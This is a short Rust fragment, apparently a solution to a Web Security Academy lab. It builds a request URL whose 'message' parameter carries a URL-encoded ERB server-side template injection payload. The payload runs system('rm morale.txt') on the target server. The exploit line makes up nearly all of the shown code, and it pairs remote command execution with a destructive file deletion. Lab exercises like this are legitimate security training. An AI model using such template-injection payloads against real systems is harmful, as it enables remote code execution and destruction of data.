...
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ...
    let url = "https://0a61002003ff236c816b759100df004b.web-security-academy.net/?message=%3C%25%3d+system(%22rm+morale.txt%22)+%25%3E";
